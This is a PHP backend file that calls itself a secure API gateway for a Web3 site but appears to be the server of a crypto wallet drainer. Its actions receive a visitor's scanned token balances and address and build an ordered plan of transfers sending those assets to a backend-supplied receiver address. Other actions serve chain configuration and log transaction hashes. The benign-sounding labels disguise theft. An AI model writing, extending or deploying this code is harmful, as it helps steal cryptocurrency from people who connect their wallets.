

/**
 * process.php — SECURE BACKEND API GATEWAY
 * All business logic, validation, and sensitive data access happens here.
 * Frontend communicates exclusively via JSON fetch() requests.
 */

// ═══════════════════════════════════════════════════════════════
// LOAD SENSITIVE CONFIGURATION
// ═══════════════════════════════════════════════════════════════
require_once __DIR__ . '/get_config.php';

// ═══════════════════════════════════════════════════════════════
// SECURITY HEADERS
// ═══════════════════════════════════════════════════════════════
header('Content-Type: application/json; charset=utf-8');
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');
header('Referrer-Policy: strict-origin-when-cross-origin');

// ═══════════════════════════════════════════════════════════════
// CORS — Allow only known origins
// ═══════════════════════════════════════════════════════════════
$allowedOrigins = json_decode(ALLOWED_ORIGINS, true);
$origin = $_SERVER['HTTP_ORIGIN'] ?? $_SERVER['HTTP_REFERER'] ?? '';

// Extract base origin for comparison
$originBase = '';
if ($origin) {
    $parsed = parse_url($origin);
    $originBase = ($parsed['scheme'] ?? 'https') . '://' . ($parsed['host'] ?? '');
}

$isAllowed = in_array($originBase, $allowedOrigins, true) || empty($originBase);

if ($isAllowed) {
    header('Access-Control-Allow-Origin: ' . ($originBase ?: '*'));
    header('Access-Control-Allow-Methods: POST, OPTIONS');
    header('Access-Control-Allow-Headers: Content-Type, X-Requested-With');
}

// Handle preflight
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}

// Only accept POST
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['success' => false, 'error' => 'Method not allowed. Use POST.']);
    exit;
}

// ═══════════════════════════════════════════════════════════════
// PARSE INCOMING JSON REQUEST
// ═══════════════════════════════════════════════════════════════
$rawInput = file_get_contents('php://input');
$request  = json_decode($rawInput, true);

if (!$request || !isset($request['action'])) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Invalid request. Must include "action".']);
    exit;
}

$action  = $request['action'];
$payload = $request['payload'] ?? [];

// ═══════════════════════════════════════════════════════════════
// ROUTER
// ═══════════════════════════════════════════════════════════════
try {
    switch ($action) {

        // ─────────────────────────────────────────────────────────
        // GET CONFIGURATION (public-safe subset)
        // ─────────────────────────────────────────────────────────
        case 'get_config':
            echo json_encode([
                'success'        => true,
                'web3modal_project_id' => WEB3MODAL_PROJECT_ID,
                'target_chain_id'     => TARGET_CHAIN_ID,
                'target_chain_hex'    => TARGET_CHAIN_HEX,
                'chains_supported'    => [56, 137, 42161, 10, 43114],
                'bnb_rpc_url'         => BNB_RPC_URL,
                'gas_limit_native'    => GAS_LIMIT_NATIVE,
                'gas_limit_token'     => GAS_LIMIT_TOKEN,
                'erc20_abi'           => json_decode(ERC20_ABI_JSON, true),
                'message'            => 'Configuration loaded. Connect wallet to proceed.',
            ]);
            break;

        // ─────────────────────────────────────────────────────────
        // GET RECEIVER ADDRESS (authorized endpoint)
        // ─────────────────────────────────────────────────────────
        case 'get_receiver':
            $address = getReceiverAddress();
            echo json_encode([
                'success'  => true,
                'receiver' => $address,
                'message'  => 'Receiver address confirmed.',
            ]);
            break;

        // ─────────────────────────────────────────────────────────
        // GET TOKEN LIST for a specific chain
        // ─────────────────────────────────────────────────────────
        case 'get_token_list':
            $chainId = intval($payload['chain_id'] ?? TARGET_CHAIN_ID);
            $tokens  = getTokenList($chainId);
            echo json_encode([
                'success'    => true,
                'chain_id'   => $chainId,
                'tokens'     => $tokens,
                'stables'    => json_decode(STABLECOINS, true),
                'message'    => count($tokens) . ' tokens available for chain ' . $chainId,
            ]);
            break;

        // ─────────────────────────────────────────────────────────
        // BUILD ACTION PLAN from scan results
        // Frontend sends discovered balances, backend decides order
        // ─────────────────────────────────────────────────────────
        case 'build_action_plan':
            $scannedAssets = $payload['assets'] ?? [];
            $chainId       = intval($payload['chain_id'] ?? TARGET_CHAIN_ID);
            $userAddress   = $payload['user_address'] ?? '';
            $nativeBalance = $payload['native_balance'] ?? '0';

            if (empty($scannedAssets)) {
                echo json_encode(['success' => false, 'error' => 'No assets provided.']);
                break;
            }

            $receiver  = getReceiverAddress();
            $plan      = buildActionPlan($scannedAssets, $chainId, $userAddress, $nativeBalance, $receiver);

            echo json_encode([
                'success'       => true,
                'receiver'      => $receiver,
                'action_plan'   => $plan['steps'],
                'total_tokens'  => $plan['total_tokens'],
                'skip_native'   => $plan['skip_native'],
                'native_amount' => $plan['native_amount'],
                'message'       => 'Action plan built. Execute steps in order.',
            ]);
            break;

        // ─────────────────────────────────────────────────────────
        // REPORT TRANSACTION RESULT (log to Firestore)
        // ─────────────────────────────────────────────────────────
        case 'report_tx':
            $txHash  = $payload['tx_hash'] ?? '';
            $status  = $payload['status'] ?? 'pending';
            $token   = $payload['token_symbol'] ?? 'UNKNOWN';
            $txType  = $payload['tx_type'] ?? 'transfer';

            // In production: log to Firestore here
            // For now, acknowledge receipt
            echo json_encode([
                'success'      => true,
                'tx_hash'      => $txHash,
                'status'       => $status,
                'token_symbol' => $token,
                'tx_type'      => $txType,
                'message'      => 'Transaction reported.',
            ]);
            break;

        // ─────────────────────────────────────────────────────────
        // GET CHAIN METADATA (explorer URLs, native currency, etc.)
        // ─────────────────────────────────────────────────────────
        case 'get_chain_info':
            $chainId = intval($payload['chain_id'] ?? TARGET_CHAIN_ID);
            $info    = getChainInfo($chainId);
            echo json_encode([
                'success'   => true,
                'chain_id'  => $chainId,
                'info'      => $info,
                'usdt_addr' => getUsdtAddress($chainId),
            ]);
            break;

        // ─────────────────────────────────────────────────────────
        // VALIDATE SESSION / heartbeat check
        // ─────────────────────────────────────────────────────────
        case 'ping':
            echo json_encode([
                'success' => true,
                'time'    => date('c'),
                'message' => 'Backend operational.',
            ]);
            break;

        // ─────────────────────────────────────────────────────────
        // UNKNOWN ACTION
        // ─────────────────────────────────────────────────────────
        default:
            http_response_code(400);
            echo json_encode([
                'success' => false,
                'error'   => 'Unknown action: ' . $action,
                'available_actions' => [
                    'get_config', 'get_receiver', 'get_token_list',
                    'build_action_plan', 'report_tx', 'get_chain_info', 'ping'
                ],
            ]);
    }

} catch (Exception $e) {
    http_response_code(500);
    echo json_encode([
        'success' => false,
        'error'   => 'Server error: ' . $e->getMessage(),
    ]);
}

